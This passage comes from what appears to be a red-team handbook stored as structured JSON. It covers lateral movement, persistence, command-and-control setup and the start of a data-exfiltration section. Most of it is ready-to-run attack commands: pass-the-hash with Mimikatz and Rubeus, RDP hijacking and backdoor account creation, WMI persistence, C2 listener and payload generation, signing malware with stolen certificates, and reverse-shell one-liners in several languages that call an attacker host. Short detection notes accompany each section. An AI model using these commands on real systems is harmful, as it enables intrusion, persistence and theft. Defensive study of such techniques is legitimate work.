              "text": "# WMI process creation\nwmic /node:target /user:user /password:pass process call create \"cmd.exe /c whoami\"\n\n# WMI with output\nwmic /node:target /user:user /password:pass process call create \"cmd.exe /c ipconfig > C:\\output.txt\""
            },
            {
              "type": "p",
              "parts": [
                "**SMB file copy and execution:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Copy file via SMB\ncopy malware.exe \\\\target\\C$\\Windows\\Temp\\malware.exe\n\n# Schedule execution\nschtasks /create /s target /u user /p pass /tn \"Update\" /tr \"C:\\Windows\\Temp\\malware.exe\" /sc once /st 00:00\nschtasks /run /s target /u user /p pass /tn \"Update\""
            },
            {
              "type": "p",
              "parts": [
                "**WinRM/PowerShell remoting:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Enter-PSSession\n$cred = Get-Credential\nEnter-PSSession -ComputerName target -Credential $cred\n\n# Invoke-Command\nInvoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }\n\n# Enable WinRM if disabled\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Remote command execution with provided credentials. Various authentication methods supported."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Network monitoring for management protocols"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of remote execution"
                  ]
                },
                {
                  "parts": [
                    "Application whitelisting"
                  ]
                },
                {
                  "parts": [
                    "Restricted admin mode"
                  ]
                },
                {
                  "parts": [
                    "**JEA**",
                    " for PowerShell"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PsExec**",
                ", ",
                "**WMI**",
                ", ",
                "**PowerShell**",
                ", ",
                "**CrackMapExec**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate administrative tools. Clean up artifacts. Understand detection capabilities."
              ]
            },
            {
              "type": "h3",
              "text": "8.2 Pass-the-Hash / Pass-the-Ticket"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using captured hashes or Kerberos tickets to authenticate without knowing clear-text passwords."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Pass-the-Hash with Mimikatz:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Mimikatz PTH\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe\n\n# Over pass-the-hash\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE /run:powershell.exe"
            },
            {
              "type": "p",
              "parts": [
                "**CrackMapExec for PTH:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# SMB with Pass-the-Hash\ncrackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH --local-auth\n\n# Multiple commands\ncrackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH -x \"whoami\""
            },
            {
              "type": "p",
              "parts": [
                "**Pass-the-Ticket with Rubeus:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Request TGT\nRubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLM_HASH\n\n# Pass-the-Ticket\nRubeus.exe ptt /ticket:base64_ticket\n\n# Silver ticket creation\nRubeus.exe silver /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /user:Administrator"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Authentication and access with hashes or tickets instead of passwords."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor for unusual authentication patterns"
                  ]
                },
                {
                  "parts": [
                    "Kerberos auditing"
                  ]
                },
                {
                  "parts": [
                    "**LSA**",
                    " protection"
                  ]
                },
                {
                  "parts": [
                    "Restricted admin mode"
                  ]
                },
                {
                  "parts": [
                    "**Credential Guard**"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Mimikatz**",
                ", ",
                "**Rubeus**",
                ", ",
                "**CrackMapExec**",
                ", ",
                "**Metasploit**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Understand ticket and hash limitations. Clean up ticket caches. Monitor for detection."
              ]
            },
            {
              "type": "h3",
              "text": "8.3 Remote Desktop Protocol (RDP)"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Graphical remote access to systems for lateral movement and administrative tasks."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**RDP connection:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Windows RDP\nmstsc /v:target:3389\n\n# Linux RDP clients\nxfreerdp /u:user /p:pass /v:target\nrdesktop -u user -p pass target"
            },
            {
              "type": "p",
              "parts": [
                "**RDP through jump hosts:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Port forwarding with chisel\n# On jump host: chisel server -p 8080 --reverse\n# On attacker: chisel client jump:8080 R:3389:target:3389\n\n# Then connect to localhost:3389\nmstsc /v:127.0.0.1:3389"
            },
            {
              "type": "p",
              "parts": [
                "**RDP session management:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check RDP sessions\nqwinsta /server:target\nquery session /server:target\n\n# Shadow session (requires specific privileges)\ntscon 2 /dest:console"
            },
            {
              "type": "p",
              "parts": [
                "**RDP hijacking:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# With SYSTEM privileges\ntscon 2 /dest:rdp-tcp#0\n\n# Create backdoor RDP user\nnet user backdoor Password123! /add\nnet localgroup \"Remote Desktop Users\" backdoor /add"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Graphical access to remote systems. File transfer capabilities. Multiple session support."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**RDP**",
                    " connection logging"
                  ]
                },
                {
                  "parts": [
                    "Network-level authentication"
                  ]
                },
                {
                  "parts": [
                    "Account lockout policies"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " ",
                    "**RDP**",
                    " monitoring"
                  ]
                },
                {
                  "parts": [
                    "**RDP**",
                    " gateway usage"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**mstsc**",
                ", ",
                "**xfreerdp**",
                ", ",
                "**rdesktop**",
                ", ",
                "**Chisel**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use ",
                "**VPN**",
                " when possible. Limit ",
                "**RDP**",
                " exposure. Monitor for unusual connections."
              ]
            },
            {
              "type": "h3",
              "text": "8.4 Credential Reuse"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using captured credentials across multiple systems where users may have reused passwords."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Password spraying across systems:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Test credentials across multiple hosts\n$computers = Get-Content computers.txt\n$cred = Get-Credential\n\nforeach ($computer in $computers) {\n    if (Test-Connection $computer -Count 1 -Quiet) {\n        try {\n            Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop\n            Write-Host \"Success on $computer\" -ForegroundColor Green\n        } catch {\n            Write-Host \"Failed on $computer\" -ForegroundColor Red\n        }\n    }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**CrackMapExec for credential reuse:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Test credentials across network\ncrackmapexec smb 10.10.10.0/24 -u user -p password --continue-on-success\n\n# With hash\ncrackmapexec smb 10.10.10.0/24 -u user -H NTLM_HASH --continue-on-success"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell remoting with reused creds:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Check admin access\nInvoke-CheckLocalAdminAccess -ComputerName target\n\n# Test-WSMan with credentials\nTest-WSMan -ComputerName target -Credential $cred"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Access to multiple systems with same credentials. Common in poorly managed environments."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Unique passwords per system"
                  ]
                },
                {
                  "parts": [
                    "**LAPS**",
                    " implementation"
                  ]
                },
                {
                  "parts": [
                    "Account monitoring"
                  ]
                },
                {
                  "parts": [
                    "Failed login alerts"
                  ]
                },
                {
                  "parts": [
                    "Password policy enforcement"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**CrackMapExec**",
                ", ",
                "**PowerShell**",
                ", ",
                "**Metasploit**",
                ", custom scripts"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Avoid account lockouts. Use timing between attempts. Document access patterns."
              ]
            },
            {
              "type": "h3",
              "text": "8.5 WMI Event Subscription"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Creating WMI event subscriptions for persistence and lateral movement through event-triggered execution."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**WMI event subscription for persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create event filter\n$FilterArgs = @{\n    Name = 'WindowsUpdateFilter'\n    EventNameSpace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'\"\n}\n\n$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\n\n# Create event consumer\n$ConsumerArgs = @{\n    Name = 'WindowsUpdateConsumer'\n    CommandLineTemplate = \"cmd.exe /c C:\\malware.exe\"\n}\n\n$Consumer = Set-WmiInstance -Namespace root/subscription -Class __CommandLineEventConsumer -Arguments $ConsumerArgs\n\n# Bind filter to consumer\n$BindingArgs = @{\n    Filter = $Filter\n    Consumer = $Consumer\n}\n\n$Binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs"
            },
            {
              "type": "p",
              "parts": [
                "**Remote WMI event subscription:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Remote WMI connection\n$Options = New-CimSessionOption -Protocol DCOM\n$Session = New-CimSession -ComputerName target -SessionOption $Options -Credential $cred\n\n# Create subscription on remote system\nInvoke-CimMethod -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -MethodName Create -Arguments $FilterArgs"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Code execution triggered by specific system events. Stealthy persistence mechanism."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**WMI**",
                    " event subscription auditing"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " ",
                    "**WMI**",
                    " monitoring"
                  ]
                },
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "Regular ",
                    "**WMI**",
                    " repository reviews"
                  ]
                },
                {
                  "parts": [
                    "Monitor ",
                    "**WMI**",
                    " activity"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell**",
                ", ",
                "**WMI**",
                ", ",
                "**CIM**",
                ", ",
                "**Metasploit**",
                " ",
                "**WMI**",
                " modules"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate-looking names. Clean up subscriptions. Understand event trigger conditions."
              ]
            },
            {
              "type": "h2",
              "text": "9. 📡 Command & Control (C2)"
            },
            {
              "type": "h3",
              "text": "9.1 C2 Frameworks"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Centralized platforms for managing compromised systems, executing commands, and maintaining persistent access during engagements."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit handlers:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Basic reverse handler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nset ExitOnSession false\nexploit -j\n\n# Staged vs stageless\nset payload windows/meterpreter_reverse_https  # staged\nset payload windows/x64/meterpreter_reverse_https  # 64-bit\nset payload windows/shell_reverse_tcp  # non-meterpreter\n\n# Advanced options\nset SessionCommunicationTimeout 300\nset SessionExpirationTimeout 604800\nset OverrideRequestHost true"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike teamserver:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Start teamserver\n./teamserver 10.10.14.20 password profile.profile\n\n# Connect with client\n./cobaltstrike\n\n# Generate payloads\nAttacks → Packages → Windows Executable\nAttacks → Packages → HTML Application\nAttacks → Scripted Web Delivery\n\n# Listener setup\nCobalt Strike → Listeners → Add"
            },
            {
              "type": "p",
              "parts": [
                "**Sliver C2:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Start server\nsliver-server\n\n# Generate implants\ngenerate --http http://10.10.14.20:80 --os windows --arch amd64\ngenerate --mtls 10.10.14.20:443 --os linux --arch amd64\n\n# List sessions\nsessions\n\n# Interact with implant\nuse <implant-id>"
            },
            {
              "type": "p",
              "parts": [
                "**Empire:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Start Empire\n./empire\n\n# Listener setup\nuselistener http\nset Host http://10.10.14.20\nset Port 80\nexecute\n\n# Stager generation\nusestager multi/launcher\nset Listener http\nexecute"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Centralized control of compromised systems, automated tasking, and post-exploitation modules."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Network traffic analysis for C2 patterns"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " behavioral detection"
                  ]
                },
                {
                  "parts": [
                    "Certificate pinning"
                  ]
                },
                {
                  "parts": [
                    "Network segmentation"
                  ]
                },
                {
                  "parts": [
                    "C2 domain blocking"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit**",
                ", ",
                "**Cobalt Strike**",
                ", ",
                "**Sliver**",
                ", ",
                "**Empire**",
                ", ",
                "**Covenant**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use encrypted channels, domain fronting, and legitimate-looking traffic patterns. Rotate infrastructure regularly."
              ]
            },
            {
              "type": "h3",
              "text": "9.2 Protocols (HTTP/S, DNS, etc.)"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using various network protocols for C2 communication to bypass network controls and evade detection."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**HTTP/S C2:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Metasploit HTTP/S handler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nset OverrideRequestHost true\nset OverrideLHOST google.com  # Domain fronting\n\n# Cobalt Strike Malleable C2 profile\nhttp-get {\n    set uri \"/api/collect\";\n    client {\n        header \"User-Agent\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\";\n        metadata {\n            base64url;\n            prepend \"token=\";\n            header \"Cookie\";\n        }\n    }\n    server {\n        header \"Server\" \"Apache\";\n        output {\n            base64url;\n            print;\n        }\n    }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**DNS C2:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# dnscat2 setup\n# Server\nsudo ruby dnscat2.rb --dns domain=attacker.com,host=0.0.0.0\n\n# Client\ndnscat2.exe --dns server=10.10.14.20,port=53 --secret=mysecret\n\n# Cobalt Strike DNS beacon\n# Configure DNS listener with domains"
            },
            {
              "type": "p",
              "parts": [
                "**ICMP C2:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# icmpsh server\npython icmpsh_m.py 10.10.14.20 10.10.10.50\n\n# Client execution (Windows)\nicmpsh.exe -t 10.10.14.20 -d 500 -s 128 -r 10"
            },
            {
              "type": "p",
              "parts": [
                "**SMB C2:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Metasploit SMB beacon\nuse payload windows/smb/meterpreter_reverse_tcp\nset LHOST 10.10.14.20\nset LPORT 445\n\n# Named pipe communication\nuse exploit/windows/local/pipe_scheduler"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Stealthy C2 channels that blend with normal network traffic. Protocol-specific advantages and limitations."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Protocol anomaly detection"
                  ]
                },
                {
                  "parts": [
                    "DNS query monitoring"
                  ]
                },
                {
                  "parts": [
                    "ICMP payload inspection"
                  ]
                },
                {
                  "parts": [
                    "SMB signing enforcement"
                  ]
                },
                {
                  "parts": [
                    "Network traffic baselining"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**dnscat2**",
                ", ",
                "**icmpsh**",
                ", ",
                "**Metasploit**",
                ", ",
                "**Cobalt Strike**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Match protocol to target environment. Use encryption and obfuscation. Monitor for protocol-specific detection."
              ]
            },
            {
              "type": "h3",
              "text": "9.3 Beacon Configuration"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Configuring C2 beacon behavior for stealth, resilience, and operational effectiveness."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Sleep and jitter settings:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Cobalt Strike sleep settings\nbeacon> sleep 60000    # 60 seconds between callbacks\nbeacon> jitter 25      # 25% random variation\nbeacon> sleep 0        # For interactive tasks\n\n# Metasploit timing\nset SessionCommunicationTimeout 300\nset SessionExpirationTimeout 604800"
            },
            {
              "type": "p",
              "parts": [
                "**Working hours:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Set beacon working hours (Cobalt Strike)\nbeacon> set working-hours \"9-17\"\n\n# Or in Malleable C2 profile\ncode-signer {\n    set keystore \"keystore.jks\";\n    set password \"password\";\n    set alias \"example\";\n}"
            },
            {
              "type": "p",
              "parts": [
                "**Staging options:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Stageless payload generation\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.20 LPORT=443 -f exe -o beacon.exe\n\n# With custom template\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.20 LPORT=443 -x legit.exe -f exe -o hidden.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Malleable C2 profiles:**"
              ]
            },
            {
              "type": "code",
              "language": "c",
              "text": "# Example profile for traffic mimicry\nhttp-get {\n    set uri \"/search\";\n    client {\n        parameter \"q\" \"search term\";\n        header \"Accept\" \"text/html\";\n        metadata {\n            netbios;\n            parameter \"q\";\n        }\n    }\n    server {\n        header \"Content-Type\" \"text/html\";\n        output {\n            netbios;\n            print;\n        }\n    }\n}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Controlled beacon behavior, reduced detection risk, and operational flexibility."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Beacon timing analysis"
                  ]
                },
                {
                  "parts": [
                    "Traffic pattern recognition"
                  ]
                },
                {
                  "parts": [
                    "Certificate validation"
                  ]
                },
                {
                  "parts": [
                    "Behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "Memory scanning"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike**",
                ", ",
                "**Metasploit**",
                ", Malleable C2, ",
                "**Arsenal Image Mounter**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test profiles against target security controls. Adjust timing based on engagement scope."
              ]
            },
            {
              "type": "h3",
              "text": "9.4 C2 Evasion"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Techniques to avoid C2 detection by network security controls and ",
                "**EDR**",
                " solutions."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Domain fronting:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Using CDN for fronting\nset OverrideLHOST front.domain.com\nset OverrideRequestHost true\n\n# CloudFront setup\n# Create CloudFront distribution pointing to C2 server\n# Use distribution domain in payloads"
            },
            {
              "type": "p",
              "parts": [
                "**Traffic segmentation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Multiple listeners for different purposes\n# HTTP for small commands\n# HTTPS for data exfiltration\n# DNS for critical infrastructure\n\n# Cobalt Strike redirectors\nsocat TCP-LISTEN:80,fork TCP:teamserver:80"
            },
            {
              "type": "p",
              "parts": [
                "**Protocol hopping:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Change protocols based on context\nhttp-get → https-post → dns\n\n# Metasploit transport changing\nmeterpreter > transport add -t reverse_https -l 10.10.14.20 -p 443\nmeterpreter > transport next"
            },
            {
              "type": "p",
              "parts": [
                "**Code signing and obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Sign payloads with stolen certificates\nsigthief.py -i legit.exe -t malware.exe -o signed_malware.exe\n\n# Binary obfuscation\nupx -9 beacon.exe"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced detection rates and extended C2 lifespan through evasion techniques."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "TLS inspection"
                  ]
                },
                {
                  "parts": [
                    "Certificate transparency monitoring"
                  ]
                },
                {
                  "parts": [
                    "Behavioral correlation"
                  ]
                },
                {
                  "parts": [
                    "Network baselining"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " integration"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**DomainFrontingTools**",
                ", ",
                "**socat**",
                ", ",
                "**Metasploit**",
                ", ",
                "**Cobalt Strike**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Balance evasion with functionality. Test against target controls. Have fallback mechanisms."
              ]
            },
            {
              "type": "h3",
              "text": "9.5 Reverse Shells & One-Liners"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Quick command execution for initial access and establishing C2 channels without full implants."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell reverse shells:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Basic one-liner\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n# Base64 encoded\n$command = 'above command'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -enc $encoded"
            },
            {
              "type": "p",
              "parts": [
                "**Netcat reverse shells:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux\nnc -e /bin/sh 10.10.14.20 443\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 443 >/tmp/f\n\n# Windows\nnc.exe 10.10.14.20 443 -e cmd.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Python reverse shells:**"
              ]
            },
            {
              "type": "code",
              "language": "python",
              "text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Python3 with error handling\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
            },
            {
              "type": "p",
              "parts": [
                "**Bash reverse shells:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "bash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Alternative bash\n/bin/bash -l > /dev/tcp/10.10.14.20/443 0<&1 2>&1\n\n# With socat\nsocat TCP:10.10.14.20:443 EXEC:/bin/bash"
            },
            {
              "type": "p",
              "parts": [
                "**PHP reverse shells:**"
              ]
            },
            {
              "type": "code",
              "language": "php",
              "text": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/443 0>&1'\");?>\n\n<?php system('nc -e /bin/sh 10.10.14.20 443'); ?>"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Immediate shell access for quick tasks or initial foothold establishment."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Network monitoring for reverse connections"
                  ]
                },
                {
                  "parts": [
                    "Process lineage monitoring"
                  ]
                },
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " shell detection"
                  ]
                },
                {
                  "parts": [
                    "Outbound connection filtering"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Netcat**",
                ", ",
                "**PowerShell**",
                ", ",
                "**Python**",
                ", ",
                "**Bash**",
                ", ",
                "**RevShells.com**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use encoded versions when possible. Consider staging to full implants. Clean up after use."
              ]
            },
            {
              "type": "h2",
              "text": "10. 📤 Exfiltration"
            },
            {
              "type": "h3",
              "text": "10.1 Compressing & Encoding Data"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Preparing data for exfiltration by reducing size and obfuscating content to avoid detection."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Compression techniques:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Windows compression\npowershell Compress-Archive -Path C:\\sensitive\\* -DestinationPath C:\\temp\\data.zip\n\n# Linux compression\ntar -czf data.tar.gz /home/user/sensitive/\nzip -r data.zip /home/user/sensitive/\n\n# 7zip for better compression\n7z a -pPassword123 data.7z C:\\sensitive\\"
            },
            {
              "type": "p",
              "parts": [
                "**Encoding methods:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
